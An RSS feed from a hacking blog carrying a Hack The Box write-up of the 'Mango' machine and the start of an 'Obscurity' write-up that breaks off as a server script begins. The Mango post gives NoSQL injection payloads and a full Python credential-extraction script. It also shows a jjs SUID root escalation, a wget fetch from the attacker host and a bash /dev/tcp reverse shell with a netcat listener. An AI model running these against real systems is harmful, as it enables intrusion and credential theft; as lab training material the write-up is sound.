<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Forest Hex</title>
        <link>https://foresthex.com/posts/</link>
        <description>Recent content in Posts on Forest Hex</description>
        <generator>Hugo -- gohugo.io</generator>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Thu, 04 Jun 2020 00:00:00 +0000</lastBuildDate>
        <atom:link href="https://foresthex.com/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Hack The Box - Mango</title>
            <link>https://foresthex.com/posts/hack-the-box-mango/</link>
            <pubDate>Thu, 04 Jun 2020 00:00:00 +0000</pubDate>
            
            <guid>https://foresthex.com/posts/hack-the-box-mango/</guid>
            <description>Welcome to another Forest Hex hacking adventure! üå≤üèπ Today I&amp;rsquo;ll be hacking an HTB box Named Mango.
 As always, we start with a port scan. Feel free to jump around.
 Port Scan Investigating the Web Server Exploiting the Login Page Creating a Python Script The Final Script Getting User Getting Root   Port Scan Port Scan  Pretty standard here, SSH and a web server running on port 80 and 443 for http and https respectively.</description>
            <content type="html"><![CDATA[<h3 id="welcome-to-another-forest-hex-hacking-adventure-">Welcome to another Forest Hex hacking adventure! üå≤üèπ</h3>
<p><em>Today I&rsquo;ll be hacking an HTB box Named Mango.</em></p>

    <figure class="left" >
        <img src="1575440078.png"   />

        
    </figure>


<p>As always, we start with a port scan. Feel free to jump around.</p>
<ul>
<li><a href="#port-scan">Port Scan</a></li>
<li><a href="#investigating-the-web-server">Investigating the Web Server</a></li>
<li><a href="#exploiting-the-login-page">Exploiting the Login Page</a></li>
<li><a href="#creating-a-python-script">Creating a Python Script</a></li>
<li><a href="#the-final-script">The Final Script</a></li>
<li><a href="#getting-user">Getting User</a></li>
<li><a href="#getting-root">Getting Root</a></li>
</ul>
<hr>
<h1 id="port-scan">Port Scan</h1>

    <figure class="left" >
        <img src="1575440838.png"   />

        
            <figcaption class="center" >Port Scan</figcaption>
        
    </figure>


<p>Pretty standard here, SSH and a web server running on port 80 and 443 for http and https respectively.
It looks like the port 80 one got a 403 error from nmap so let&rsquo;s check out the https one.</p>
<hr>
<h1 id="investigating-the-web-server">Investigating the Web Server</h1>

    <figure class="left" >
        <img src="1575440976.png"   />

        
            <figcaption class="center" >Home Site</figcaption>
        
    </figure>


<p>A google clone, neat. From the looks of it I can use the analytics page with full functionality. It&rsquo;s using PHP according to wappalyzer, and not much else.</p>
<p>After some investigation it turned out the analytics is running software called flexmonster. There may be exploit potential there, but first I decided to load up ZAP and run a vuln scan. It came up empty for the most part, nothing useful.</p>
<p>Searchsploit came up with nothing about flexmonster exploits, and a google search showed some potential but sparse forum posts from concerned users rather than disclosures. I decided to try gobuster at this point to find any hidden directories.</p>
<p><code>gobuster dir -u &quot;https://10.10.10.162/&quot; -r -a &quot;Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0&quot; -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -k</code></p>
<p><code>-k</code> ignores SSL issues, <code>-a</code> sets my user-agent to a normal one in case they have detection, and <code>-r</code> follows redirects. I point it to a decent directory list and go.</p>

    <figure class="left" >
        <img src="1575445364.png"   />

        
            <figcaption class="center" >GoBuster Running</figcaption>
        
    </figure>



    <figure class="left" >
        <img src="1575472573.png"   />

        
            <figcaption class="center" >No GoBuster Results</figcaption>
        
    </figure>


<p>No luck, just a forbidden apache page. I decided to try nikto next, an apache web server scanner.
<code>nikto -host &quot;https://10.10.10.162&quot;</code></p>
<p>Off the bat we got some domain info from the SSL cert:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">CN<span style="color:#f92672">=</span>staging-order.mango.htb
emailAddress<span style="color:#f92672">=</span>admin@mango.htb
</code></pre></div><p>I also should have noticed that from the nmap scan. While nikto was running I decided to add the hostname to <code>/etc/hosts</code> and navigate to it.</p>
<h1 id="exploiting-the-login-page">Exploiting the Login Page</h1>
<p>
    <figure class="left" >
        <img src="1575474049.png"   />

        
            <figcaption class="center" >Login Page</figcaption>
        
    </figure>


Paydirt! Here&rsquo;s a login page and we at least know there&rsquo;s one user named admin probably.</p>
<p>I played around with this page for quite a while. I ran a ZAP vuln scan and test some basic SQL injection but had no luck. I ran nikto and even wapiti, but came up empty.</p>

    <figure class="left" >
        <img src="1575601487.png"   />

        
            <figcaption class="center" >No Vulns Found</figcaption>
        
    </figure>


<p>I then decided to try some other forms of injection, maybe it&rsquo;s not running SQL at all. I looked up some NoSQL injection techniques and after a little playing around I found a way in. I had to modify the POST request to get it to work, which was easy since I had the site loaded in a ZAP proxy which injects a nice front end on top of the site. Check it out:</p>

    <figure class="left" >
        <img src="gotin.gif"   />

        
            <figcaption class="center" >NoSQLi</figcaption>
        
    </figure>


<p>As you can see we are able to login, but it&rsquo;s kind of useless at the moment. It&rsquo;s under construction and investigating the source doesn&rsquo;t reveal any new information. However, armed with a success case for NoSQLi, we can brute force character by character to get account information. This could let us into other places, perhaps even SSH access if we are lucky.</p>
<p>Now I&rsquo;m not familiar with mongoDB, which is the DB being used based on the noSQL injection that worked, but I&rsquo;ve learned enough to know where to look.</p>
<p><a href="https://docs.mongodb.com/manual/reference/operator/query/">https://docs.mongodb.com/manual/reference/operator/query/</a> - A lovely reference on what&rsquo;s called Query and Projection operators. This is why the injection works using <code>$gt</code>, it stands for greater than and will change the logic that checks for a valid password. In short, instead of checking if you have the user password right, it will check if the user&rsquo;s password is greater than NULL. Since everything evaluates to greater than null it will always be true and it lets you in.</p>
<p>I found a more specific blog post about what I&rsquo;m trying to achieve here:
<a href="https://blog.0daylabs.com/2016/09/05/mongo-db-password-extraction-mmactf-100/">https://blog.0daylabs.com/2016/09/05/mongo-db-password-extraction-mmactf-100/</a></p>
<p>The jist of it is, we can extract information by using <code>{username: {$regex: &lt;char_to_test&gt;.*}}</code>. Mongo will evaluate the regular expression that&rsquo;s provided. Regex is a pretty big topic of it&rsquo;s own, but for here you only need to know that <code>.*</code> translates to mean match anything, so as long as I get <code>&lt;char_to_test&gt;</code> right it will evaluate to true and let me in.</p>
<hr>
<h1 id="creating-a-python-script">Creating a Python Script</h1>
<p>Now the page above is a good starting point, but a lot of changes are in order:</p>
<ul>
<li>No testing regex special characters.</li>
<li>Users are not enumerated.</li>
<li>No valid PHP session id.</li>
</ul>
<p>To test for regex special characters we need to escape them with <code>\</code>. This means it will take 2 characters to test these and iterating over a string will no longer work. The solution is to iterate over an array.</p>
<h4 id="adding-regex-special-characters">Adding Regex Special Characters</h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">char_str <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_letters <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;~&#39;`!@#%_=,:;/</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>
regex_escapes <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;\{&#39;</span>, <span style="color:#e6db74">&#39;\}&#39;</span>, <span style="color:#e6db74">&#39;\*&#39;</span>, <span style="color:#e6db74">&#39;\^&#39;</span>, <span style="color:#e6db74">&#39;\+&#39;</span>, <span style="color:#e6db74">&#39;\?&#39;</span>, <span style="color:#e6db74">&#39;\-&#39;</span>, <span style="color:#e6db74">&#39;\&amp;&#39;</span>, <span style="color:#e6db74">&#39;\(&#39;</span>, <span style="color:#e6db74">&#39;\)&#39;</span>, <span style="color:#e6db74">&#39;\[&#39;</span>, <span style="color:#e6db74">&#39;\]&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;\&lt;&#39;</span>, <span style="color:#e6db74">&#39;\&gt;&#39;</span>, <span style="color:#e6db74">&#39;\|&#39;</span>]
chars_to_test <span style="color:#f92672">=</span> list(char_str) <span style="color:#f92672">+</span> regex_escapes
</code></pre></div><p>The above code takes all single character possibilities that aren&rsquo;t regex special characters and combines them into a single string: <code>char_str</code>.  It then defines an array of escaped regex special characters, and finally it converts <code>char_str</code> into a list and concatenate it to the list of escaped regular expressions.</p>
<p>I can now iterate <code>chars_to_test</code> and it will test all special characters, including those which would normally be interperted differently in the regular expression.</p>
<hr>
<h4 id="extracting-users">Extracting Users</h4>
<p>To grab the users instead of the password the payload has to be changed:
<code>username[$regex]=^&lt;CHAR_TO_TEST&gt;.*&amp;password[$gt]=&amp;login=login</code></p>
<p>Also the method should be different. It&rsquo;s possible to have user with several of the same starting letters, so instead of stopping at the first character we match the logic will go as follows:</p>
<pre><code>1. Start with an empty list of users.
2. Send users to a function which will attempt to find all users.
   a. If the list is empty:       
      i. Iterate through every character to test.
      ii. Append to new list if valid.
      iii. Return new list of valid characters.
   b. If the list is not empty:
      i. Iterate through each user in the list.
         a. Iterate through every character to test, appending it to the username.
         b. Append to new list if valid.
         c. Return list list of valid user strings.
3. If the original list of users == the new list:
   a. Return the list, users fully enumerated at this point.
4. If the original list of users != the new list:
   a. Replace the original list of users with the new one.
   b. Return to step 2 where we send users to function.

</code></pre><p>This method ensures the script won&rsquo;t stop at the first valid character for each attempt, and will allow the known users list size to increase as it finds more valid combinations.</p>
<p><code>['a', 'm']</code> could turn into <code>['ad', 'ma', 'mi']</code> for example if we had <code>admin</code>, <code>matt</code>, and <code>mike</code> as valid values. Once the new list returned is the same as the old one then there is no reason to continue enumerating as it would just repeat infinitely.</p>
<hr>
<h4 id="grabbing-the-php-session-id">Grabbing the PHP Session ID</h4>
<p>It&rsquo;s important to keep the headers valid for these requests. To do so I just copied the valid headers I interecepted in ZAP and did a little regex replace magic to create a dictionary object in python for use with the popular <code>requests</code> module. One issue with just using it directly like that is the PHP Session ID cookie changes, and I don&rsquo;t want to manually update it every time it expires.</p>
<p>Grabbing it is very easy with the <code>requests</code> module:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">grab_sessid_header</span>():
    res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;http://staging-order.mango.htb/&#39;</span>, headers<span style="color:#f92672">=</span>headers, proxies<span style="color:#f92672">=</span>proxies, verify<span style="color:#f92672">=</span>False)
    phpid <span style="color:#f92672">=</span> res<span style="color:#f92672">.</span>cookies[<span style="color:#e6db74">&#39;PHPSESSID&#39;</span>]
    cookie_header <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;Cookie&#39;</span>: f<span style="color:#e6db74">&#39;PHPSESSID={phpid}&#39;</span>}
    <span style="color:#66d9ef">return</span> cookie_header
</code></pre></div><p>As well as adding it to your <code>headers</code> dictionary:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">headers<span style="color:#f92672">.</span>update(grab_sessid_header())
</code></pre></div><hr>
<h1 id="the-final-script">The Final Script</h1>
<p>The end result is a script that enumerates all users first, and then attempts to find the passwords for each.
You can see it in action:</p>

    <figure class="left" >
        <img src="cracking.gif"   />

        
            <figcaption class="center" >Script in Action</figcaption>
        
    </figure>


<p>Here&rsquo;s the full script.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> requests
<span style="color:#f92672">import</span> string
<span style="color:#75715e"># proxies = {&#34;http&#34;: &#34;http://127.0.0.1:12480&#34;, &#34;https&#34;: &#34;http://127.0.0.1:12480&#34;}</span>
proxies <span style="color:#f92672">=</span> {}
headers <span style="color:#f92672">=</span> {
<span style="color:#e6db74">&#39;User-Agent&#39;</span>:<span style="color:#e6db74">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0&#39;</span>,
<span style="color:#e6db74">&#39;Accept&#39;</span>:<span style="color:#e6db74">&#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;</span>,
<span style="color:#e6db74">&#39;Accept-Language&#39;</span>:<span style="color:#e6db74">&#39;en-US,en;q=0.5&#39;</span>,
<span style="color:#e6db74">&#39;Content-Type&#39;</span>:<span style="color:#e6db74">&#39;application/x-www-form-urlencoded&#39;</span>,
<span style="color:#e6db74">&#39;Origin&#39;</span>:<span style="color:#e6db74">&#39;https://staging-order.mango.htb&#39;</span>,
<span style="color:#e6db74">&#39;Connection&#39;</span>:<span style="color:#e6db74">&#39;keep-alive&#39;</span>,
<span style="color:#e6db74">&#39;Referer&#39;</span>:<span style="color:#e6db74">&#39;https://staging-order.mango.htb/&#39;</span>,
<span style="color:#e6db74">&#39;Upgrade-Insecure-Requests&#39;</span>:<span style="color:#e6db74">&#39;1&#39;</span>,
<span style="color:#e6db74">&#39;Host&#39;</span>:<span style="color:#e6db74">&#39;staging-order.mango.htb&#39;</span>
}

<span style="color:#75715e"># Returns Chars: [a, c], stops at first if desired, this is useful for passwords</span>
<span style="color:#75715e"># Expects &lt;CHAR&gt;, replaces with actual char</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">iterate_chars</span>(payload, stop_at_first <span style="color:#f92672">=</span> False):
    valid_chars <span style="color:#f92672">=</span> []
    char_str <span style="color:#f92672">=</span> string<span style="color:#f92672">.</span>ascii_letters <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;~&#39;`!@#%_=,:;/</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>
    regex_escapes <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;\{&#39;</span>, <span style="color:#e6db74">&#39;\}&#39;</span>, <span style="color:#e6db74">&#39;\*&#39;</span>, <span style="color:#e6db74">&#39;\^&#39;</span>, <span style="color:#e6db74">&#39;\+&#39;</span>, <span style="color:#e6db74">&#39;\?&#39;</span>, <span style="color:#e6db74">&#39;\-&#39;</span>, <span style="color:#e6db74">&#39;\&amp;&#39;</span>, <span style="color:#e6db74">&#39;\(&#39;</span>, <span style="color:#e6db74">&#39;\)&#39;</span>, <span style="color:#e6db74">&#39;\[&#39;</span>, <span style="color:#e6db74">&#39;\]&#39;</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">&#39;\&lt;&#39;</span>, <span style="color:#e6db74">&#39;\&gt;&#39;</span>, <span style="color:#e6db74">&#39;\|&#39;</span>]
    chars_to_test <span style="color:#f92672">=</span> list(char_str) <span style="color:#f92672">+</span> regex_escapes
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> chars_to_test:
        data <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#39;&lt;CHAR&gt;&#39;</span>, i)
        res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#39;http://staging-order.mango.htb/&#39;</span>, data<span style="color:#f92672">=</span>data, allow_redirects<span style="color:#f92672">=</span>False, headers<span style="color:#f92672">=</span>headers, proxies<span style="color:#f92672">=</span>proxies, verify<span style="color:#f92672">=</span>False)
        <span style="color:#66d9ef">if</span> res<span style="color:#f92672">.</span>status_code <span style="color:#f92672">==</span> <span style="color:#ae81ff">302</span>:
            valid_chars<span style="color:#f92672">.</span>append(i[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>:])
            <span style="color:#66d9ef">if</span> stop_at_first:
                <span style="color:#66d9ef">return</span> valid_chars
    <span style="color:#66d9ef">return</span> valid_chars

<span style="color:#75715e"># Iterates through all known starts to user strings, attempts to find all valid chars for each</span>
<span style="color:#75715e"># Returns an updated list of found users</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">iterate_users</span>(users):
    user_payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;username[$regex]=^&lt;CHAR&gt;.*&amp;password[$gt]=&amp;login=login&#39;</span>
    new_found_users <span style="color:#f92672">=</span> []
    <span style="color:#66d9ef">if</span> len(users) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
        found_users <span style="color:#f92672">=</span> iterate_chars(user_payload)
        <span style="color:#66d9ef">print</span>(found_users)
        <span style="color:#66d9ef">return</span> found_users
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">for</span> user <span style="color:#f92672">in</span> users:
            user_payload <span style="color:#f92672">=</span> f<span style="color:#e6db74">&#39;username[$regex]=^{user}&lt;CHAR&gt;.*&amp;password[$gt]=&amp;login=login&#39;</span>
            new_chars <span style="color:#f92672">=</span> iterate_chars(user_payload)
            <span style="color:#66d9ef">if</span> len(new_chars) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
                new_found_users<span style="color:#f92672">.</span>append(user)
            <span style="color:#66d9ef">else</span>:  
                <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> new_chars:
                    new_found_users<span style="color:#f92672">.</span>append(user<span style="color:#f92672">+</span>char[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>:])
        <span style="color:#66d9ef">print</span>(new_found_users)
        <span style="color:#66d9ef">return</span> new_found_users 

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_user_password</span>(user):
    found_chars <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
    <span style="color:#66d9ef">while</span> True:
        pass_payload <span style="color:#f92672">=</span> f<span style="color:#e6db74">&#39;username={user}&amp;password[$regex]=^{found_chars}&lt;CHAR&gt;.*&amp;login=login&#39;</span>
        new_char <span style="color:#f92672">=</span> iterate_chars(pass_payload, True)
        <span style="color:#66d9ef">if</span> len(new_char) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>:
            <span style="color:#66d9ef">break</span>
        found_chars <span style="color:#f92672">+=</span> new_char[<span style="color:#ae81ff">0</span>]
        <span style="color:#66d9ef">print</span>(f<span style="color:#e6db74">&#39;{user}: {found_chars}&#39;</span>)
    <span style="color:#66d9ef">return</span> found_chars

<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">iterate_passwords</span>(users):
    creds <span style="color:#f92672">=</span> { user : <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">for</span> user <span style="color:#f92672">in</span> users}
    <span style="color:#66d9ef">for</span> user <span style="color:#f92672">in</span> creds:
        creds[user] <span style="color:#f92672">=</span> find_user_password(user)
    <span style="color:#66d9ef">return</span> creds

<span style="color:#75715e"># Returns the PHP session ID as a header for requests to update with</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">grab_sessid_header</span>():
    res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;http://staging-order.mango.htb/&#39;</span>, headers<span style="color:#f92672">=</span>headers, proxies<span style="color:#f92672">=</span>proxies, verify<span style="color:#f92672">=</span>False)
    phpid <span style="color:#f92672">=</span> res<span style="color:#f92672">.</span>cookies[<span style="color:#e6db74">&#39;PHPSESSID&#39;</span>]
    cookie_header <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#39;Cookie&#39;</span>: f<span style="color:#e6db74">&#39;PHPSESSID={phpid}&#39;</span>}
    <span style="color:#66d9ef">return</span> cookie_header

<span style="color:#75715e"># Returns an array of usernames</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_all_users</span>():
    found_users <span style="color:#f92672">=</span> []
    <span style="color:#66d9ef">while</span> True:
        new_found_users <span style="color:#f92672">=</span> iterate_users(found_users)
        <span style="color:#66d9ef">if</span> new_found_users <span style="color:#f92672">==</span> found_users: 
            <span style="color:#66d9ef">print</span>(found_users)
            <span style="color:#66d9ef">break</span>
        found_users <span style="color:#f92672">=</span> new_found_users
    <span style="color:#66d9ef">return</span> found_users

<span style="color:#75715e"># Grab a new session id first</span>
headers<span style="color:#f92672">.</span>update(grab_sessid_header())
users <span style="color:#f92672">=</span> find_all_users()
<span style="color:#75715e"># users = [&#39;admin&#39;, &#39;mango&#39;]</span>
<span style="color:#75715e"># {&#39;admin&#39;: &#39;t9KcS3&gt;!0B#2&#39;, &#39;mango&#39;: &#39;h3mXK8RhU~f{]f5H&#39;}</span>
creds <span style="color:#f92672">=</span> iterate_passwords(users)
<span style="color:#66d9ef">print</span>(creds)
</code></pre></div><p>You can see the credentials it found above.</p>
<hr>
<h1 id="getting-user">Getting User</h1>
<p>The credentials worked for <code>mango</code> but not <code>admin</code>.
<code>ssh mango@mango.htb</code></p>
<p>There was no <code>user.txt</code> file in his home folder, I decided to use <code>find</code> to locate it.
<code>find / -name user.txt  2&gt;&amp;1 | grep -v &quot;Permission denied&quot;</code></p>

    <figure class="left" >
        <img src="1575759645.png"   />

        
            <figcaption class="center" >Found user.txt</figcaption>
        
    </figure>


<p>Ah ha, it&rsquo;s under admin! Maybe the password will work locally if I just use <code>su admin</code></p>

    <figure class="left" >
        <img src="1575759733.png"   />

        
            <figcaption class="center" >User Flag</figcaption>
        
    </figure>


<p>Nice, got it. This was a pretty fun route to user, I always enjoy creating my own exploits.</p>
<hr>
<h1 id="getting-root">Getting Root</h1>
<p>This shell looks weird immediately. I run <code>/bin/bash</code> and it returns to the normal prompt, prepended with the user and current directory.</p>
<p>I then checked out what processes were running as root, apache was one of them. I checked the version number: 2.4.29, vulnerable to a local privesc: <a href="https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html">https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html</a></p>
<p>I don&rsquo;t really want to wait around until 6:45 am, and I don&rsquo;t have rights to change the time on the machine so I can&rsquo;t force it. It&rsquo;s time to run <code>lse.sh</code> and see what it says. I downloaded it onto the victim by using <code>python -m SimpleHTTPServer</code> on kali in the folder I have <code>lse.sh</code>.</p>
<p>On the victim I ran: <code>wget http://10.10.14.66:8000/lse.sh</code> and then <code>chmod +x lse.sh</code> to download it and allow it to be executed. It came back with a couple of unusual SUID binaries:</p>

    <figure class="left" >
        <img src="1575830306.png"   />

        
    </figure>


<p>Mailcap seemed to require sudo access to get root. I gave it a shot, but it asked for a sudo password and neither of the passwords I have worked.</p>
<p>JJS seemed more promising, I found it also listed on GTFOBins: <a href="https://gtfobins.github.io/gtfobins/jjs/">https://gtfobins.github.io/gtfobins/jjs/</a></p>
<p>It looks like if the SUID bit is set, you can get root without sudo. You can see the commands at the bottom:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo sh -c <span style="color:#e6db74">&#39;cp $(which jjs) .; chmod +s ./jjs&#39;</span>

echo <span style="color:#e6db74">&#34;Java.type(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;/bin/sh -pc \$@|sh\${IFS}-p _ echo sh -p &lt;</span><span style="color:#66d9ef">$(</span>tty<span style="color:#66d9ef">)</span><span style="color:#e6db74"> &gt;</span><span style="color:#66d9ef">$(</span>tty<span style="color:#66d9ef">)</span><span style="color:#e6db74"> 2&gt;</span><span style="color:#66d9ef">$(</span>tty<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#39;).waitFor()&#34;</span> | ./jjs
</code></pre></div><p>Now wait, there&rsquo;s sudo in the first command!</p>
<p>Yep, but look at the command, it&rsquo;s copying JJS and setting the SUID bit on it. The binary on the system I&rsquo;m hacking already has this set so I don&rsquo;t need to run that command. I&rsquo;ll also need to change the binary the second command is piped into.</p>

    <figure class="left" >
        <img src="1575830716.png"   />

        
            <figcaption class="center" >Root ... but, not quite.</figcaption>
        
    </figure>


<p>It looks like I popped a root shell consider the prompt changed from <code>$</code> into <code>#</code>.
But&hellip; I can&rsquo;t interact with it. It&rsquo;s blinking, but any input is just ignored. Shame really, but there&rsquo;s a solution, instead of spawning a local shell I can spawn a reverse shell and the input issue should be resolved. I usually grab one from here:
<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</a></p>
<p>First I&rsquo;ll test if I can pop a reverse shell manually with the following commands:</p>
<pre><code>On Victim: `/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.66/15462 0&gt;&amp;1`
On Host: `nc -nvlp 15462`
</code></pre>
    <figure class="left" >
        <img src="1575831156.png"   />

        
    </figure>



    <figure class="left" >
        <img src="1575831185.png"   />

        
    </figure>


<p>It works! I got a shell from the user running the command, so if I can get JJS to run it as root I should get a root shell.
After a lot of playing around I did not manage to pop a reverse shell.</p>
<hr>
<h2 id="finally-getting-it-to-work">Finally getting it to work</h2>
<p>I realized at one point that it was running <code>dash</code> instead of <code>bash</code> and maybe that was messing up the prompt input.</p>
<p>I changed the command to:
<code>echo &quot;Java.type('java.lang.Runtime').getRuntime().exec('/bin/bash -pc \$@|sh\${IFS}-p _ echo /bin/bash -p &lt;$(tty) &gt;$(tty) 2&gt;$(tty)').waitFor()&quot; | jjs</code></p>
<p>As I typed the input did not show, but I tried it anyway:</p>

    <figure class="left" >
        <img src="1575833023.png"   />

        
            <figcaption class="center" >Root Flag</figcaption>
        
    </figure>


<p>Success! Although I couldn&rsquo;t see my input the commands were now run. This was a very enjoyable box and I learned a lot about noSQL injection. Until next time this is jivex5k signing off!</p>
]]></content>
        </item>
        
        <item>
            <title>Hack The Box - Obscurity</title>
            <link>https://foresthex.com/posts/hack-the-box-obscurity/</link>
            <pubDate>Sat, 30 May 2020 00:00:00 +0000</pubDate>
            
            <guid>https://foresthex.com/posts/hack-the-box-obscurity/</guid>
            <description>Welcome to another Forest Hex hacking adventure! üå≤üèπ Today I will be hacking an HTB box named Obscurity.
 This one is leaning more towards CTF style than real world, let&amp;rsquo;s see if I can manage to figure it out.
As always, feel free to jump around.
  Port Scan Checking out the Web Server The Web Server Script Popping the Reverse Shell Getting User Getting Root Getting Root Another Way   Port Scan nmap -p- -sC -sV --min-rate=1000 -T4 10.</description>
            <content type="html"><![CDATA[<h3 id="welcome-to-another-forest-hex-hacking-adventure-">Welcome to another Forest Hex hacking adventure! üå≤üèπ</h3>
<p><em>Today I will be hacking an HTB box named Obscurity.</em></p>

    <figure class="left" >
        <img src="1576081212.png"   />

        
    </figure>


<p>This one is leaning more towards CTF style than real world, let&rsquo;s see if I can manage to figure it out.</p>
<p>As always, feel free to jump around.</p>
<hr>
<ul>
<li><a href="#port-scan">Port Scan</a></li>
<li><a href="#checking-out-the-web-server">Checking out the Web Server</a></li>
<li><a href="#the-web-server-script">The Web Server Script</a></li>
<li><a href="#popping-the-reverse-shell">Popping the Reverse Shell</a></li>
<li><a href="#getting-user">Getting User</a></li>
<li><a href="#getting-root">Getting Root</a></li>
<li><a href="#getting-root-another-way">Getting Root Another Way</a></li>
</ul>
<hr>
<h1 id="port-scan">Port Scan</h1>
<p><code>nmap -p- -sC -sV --min-rate=1000 -T4 10.10.10.168</code></p>

    <figure class="left" >
        <img src="1576081605.png"   />

        
            <figcaption class="center" >Port Scan</figcaption>
        
    </figure>


<p>It found a standard SSH port open, and an http server called &ldquo;BadHTTPServer&rdquo;, never heard of it. Time to check it out this server.</p>
<hr>
<h1 id="investigating-the-web-server">Investigating the Web Server</h1>

    <figure class="left" >
        <img src="1576082234.png"   />

        
            <figcaption class="center" >Web Page</figcaption>
        
    </figure>


<p>Interesting, it sounds like this box will be all about custom exploits. That&rsquo;s pretty neat, and I see our first hint at the bottom of the page:</p>
<p><code>Message to server devs: the current source code for the web server is in 'SuperSecureServer.py' in the secret development directory</code></p>
<p>I can run gobuster to try and find this file and I&rsquo;m guessing the source code will have a vulnerability to exploit.</p>
<p>On top of that I have a user: <code>secure@obscure.htb</code></p>
<p>Finally, it says they rolled their own:</p>
<ol>
<li>Encryption</li>
<li>Web Server</li>
<li>SSH replacement</li>
</ol>
<p>That will be good to keep in mind when I get stuck.</p>
<p>I started up gobuster, but immediately ran into an error:
<code>Unsolicited response received on idle HTTP channel starting with &quot;\n&quot;; err=&lt;nil&gt;</code></p>
<p>I did a bit of research and realized wfuzz would be better suited to the task. I could create a URL like so:
<code>http://10.10.10.168:8080/FUZZ/SuperSecureServer.py</code></p>
<p>Running that command with a wordlist will replace the word FUZZ with the word from the list. Unfortunately it kept having a fatal error where the HTTP response was empty. I decided to look for another tool and came across FFUF:
<a href="https://github.com/ffuf/ffuf">https://github.com/ffuf/ffuf</a></p>
<p>This program functions similar to WFUZZ, and I managed to find the script with it.
<code>http://10.10.10.168:8080/develop/SuperSecureServer.py</code></p>
<p>I navigated to the page and was rewarded with the full script.</p>
<hr>
<h1 id="the-web-server-script">The Web Server Script</h1>
<p>Here&rsquo;s a version of the script stripped down to parts important to the exploit:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> socket
<span style="color:#f92672">import</span> os
<span style="color:#f92672">import</span> subprocess

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">Request</span>:
    <span style="color:#66d9ef">def</span> __init__(self, request):
        <span style="color:#66d9ef">try</span>:
